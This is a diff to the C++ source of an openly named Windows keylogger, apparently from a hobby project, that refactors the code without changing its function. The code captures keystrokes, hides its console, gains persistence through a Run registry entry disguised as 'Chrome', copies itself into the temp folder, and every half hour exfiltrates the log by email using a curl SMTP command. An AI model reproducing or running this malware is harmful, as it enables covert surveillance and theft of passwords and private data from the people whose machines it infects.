@@ -7,37 +7,30 @@
 #include <sstream>
 #include <tchar.h>
 #include <Lmcons.h>
-#include <iostream> //if i didn't remove that, i have forgotten about it, i need it when i testing
+#include <iostream> 
 
 #pragma warning(disable : 4996)
+using namespace std; //I have in my habit using that
 
 //U should enable less secure apps if u use gmail, https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4MGU5z42UW4nH0dAY8_FeWykqble-hNWbVnZX6rX9boPYuAtJ6h3Hps1rZt7aL17kNzR-R_m8pDgmLYmagc5mzRVeC2Zg
-const std::string exe_name = "keylogger.exe";
-const std::string LogFileName = "data.th";
-const std::string EmailFrom = "example@gmail.com";
-const std::string EmailFromPassword = "YourPassowrd";
-const std::string EmailTo = "example@gmail.com";
+const string exe_name = "keylogger.exe";
+const string LogFileName = "data.th";
+const string EmailFrom = "example@gmail.com";
+const string EmailFromPassword = "YourPassowrd";
+const string EmailTo = "example@gmail.com";
 const bool IsWindowHidden = false;
 
-using namespace std;
 
 void send() {
 	string cmd = "curl smtp://smtp.gmail.com:587 --ssl-reqd -v --mail-from \\\"" + EmailFrom + "\\\" --mail-rcpt \\\"" + EmailTo + "\\\" --ssl --upload-file %temp%\\" + LogFileName + " -u " + EmailFrom + ":" + EmailFromPassword + " -k --anyauth";
-//	cout << cmd;
 	system(cmd.c_str());
 }
-
 inline bool filexits(const std::string& name) {
 	struct stat buffer;
 	return (stat(name.c_str(), &buffer) == 0);
 }
-
-
-
-string cmd3;
-
-void set_cmd3()
-{
+string GetDirectory() {
+	string cmd3;
 	char username[UNLEN + 1];
 	DWORD username_len = UNLEN + 1;
 	GetUserName(username, &username_len);
@@ -45,44 +38,32 @@ void set_cmd3()
 	char letter[UNLEN + 1];
 	GetSystemDirectory(letter, sizeof(letter));
 
+	cmd3 += letter[0];
+	cmd3 += ":\\Users\\" + (string)username+ "\\AppData\\Local\\Temp\\";
 
-	cmd3 = letter[0];
-	cmd3 += ":\\Users\\";
-	cmd3 += username;
-	cmd3 += "\\AppData\\Local\\Temp\\";
+	return cmd3;
 }
-
 void autostart() {
-	char username[UNLEN + 1];
-	DWORD username_len = UNLEN + 1;
-	GetUserName(username, &username_len);
-
-	char letter[UNLEN + 1];
-	GetSystemDirectory(letter, sizeof(letter));
-
-
-	cmd3 = letter[0];
-	cmd3 += ":\\Users\\";
-	cmd3 += username;
-	cmd3 += "\\AppData\\Local\\Temp\\";
-	if (!filexits(cmd3.c_str())) {
+	string cmd = GetDirectory();
+	cmd += exe_name;
+	if (!filexits(cmd.c_str())) {
 		
-		string cmd2 = "Reg Add  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Chrome /t REG_SZ /d "+cmd3 + exe_name;
+		string cmd2 = "Reg Add  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Chrome /t REG_SZ /d "+cmd;
+	
 		system(cmd2.c_str());
 
 		fstream file;
 		file.open("temp.bat", ios::out);
-		file << "taskkill /IM " + exe_name + " /F\n";
-		file << "move " + exe_name + " %temp%\n";
-		file << "start  %temp%\\"+ exe_name;
-		file << "\ndel temp.bat";
-		file << "\nexit";
+		file << "taskkill /IM " + exe_name + " /F\n"
+		 << "move " + exe_name + " %temp%\n"
+		 << "start  %temp%\\"+ exe_name
+		 << "\ndel temp.bat"
+		 << "\nexit";
+
 		file.close();
 		system("start temp.bat");
 
 	}
-
-
 }
 
 
@@ -145,68 +126,59 @@ bool SpecialKeys(int S_Key) {
 	}
 }
 
-
-
-
 int main()
 {
-	//all here look shitty but  works
 	if (IsWindowHidden) ShowWindow(GetConsoleWindow(), SW_HIDE);
-	
-	set_cmd3();
 	fstream LogFile;
-	cmd3 += LogFileName;
-	LogFile.open(cmd3, ios::out);
-	cout << cmd3;
-
+	//To make sure file is created
+	LogFile.open(GetDirectory()+LogFileName, ios::out);
+	LogFile.close();
+	//Sleep because pc after boot can haven't connected to internet yet
 	Sleep(500);
-	bool test = 1;
-	bool wymaganie = 1;
+	
     autostart();
 	send();
-	
-	string jd;
-	string jd2;
-	int wynik;
-	string wynik2;
-	string linia;
-	char KEY = 'x';
-	
+	LogFile.open(LogFileName, fstream::app);
 
+	string minutes;
+	int minutesInt;
+	char KEY = 'x';
+	bool IsOnlyOneTime = true;
 	time_t t;
 	struct tm* tt;
 	time(&t);
 	tt = localtime(&t);
+
 	//Log at start of program
-	LogFile << endl <<"###" << asctime(tt);
-	wynik2 = asctime(tt)[0];
-	LogFile.close();
+	if (LogFile.is_open()) {
+		LogFile << endl << "###" << asctime(tt);
+	}
+	else
+	{
+		LogFile.open(LogFileName, fstream::app);
+		LogFile << endl << "###" << asctime(tt);
+	}
 
 	while (true) {
-		
-		time_t t;
-
-		struct tm* tt;
+		if (!LogFile.is_open()) LogFile.open(LogFileName, fstream::app);
 		time(&t);
 		tt = localtime(&t);
-		jd = asctime(tt)[15];
-		jd2 = asctime(tt)[14] + jd;
-		istringstream iss(jd2);
-		iss >> wynik;
-		if ((wynik == 00) && (test == 1) || (wynik == 30) && (test == 1))
+		minutes = asctime(tt)[14];
+		minutes += asctime(tt)[15];
+		minutesInt = atoi(minutes.c_str());
+		//saving and sending data every half an hour
+		if ((minutesInt == 00) && (IsOnlyOneTime == true) || (minutesInt == 30) && (IsOnlyOneTime == true))
 		{
-			//saving data every half an hour			
-			fstream LogFile;
-			LogFile.open(LogFileName, fstream::app);
-			LogFile << endl <<"#|#" << asctime(tt);
-			LogFile.close();
+				
+			LogFile << endl << "#|#" << asctime(tt);
 			send();
 			remove(LogFileName.c_str());
-			test = 0;
+			IsOnlyOneTime = false;
 		}
-		if ((wynik != 00) && (wynik != 30))
+		//To do upper code only one time
+		if ((minutesInt != 00) && (minutesInt != 30))
 		{
-			test = 1;
+			IsOnlyOneTime = true;
 		}
 		Sleep(10);
 		for (int KEY = 8; KEY <= 190; KEY++)
@@ -214,13 +186,7 @@ int main()
 			// Logging chars
 			if (GetAsyncKeyState(KEY) == -32767) {
 				if (SpecialKeys(KEY) == false) {
-					//Log to LogFileName
-					fstream LogFile;
-					LogFile.open(LogFileName, fstream::app);
-					if (LogFile.is_open()) {
 						LogFile << char(KEY);
-						LogFile.close();
-					}
 				}
 			}
 		}
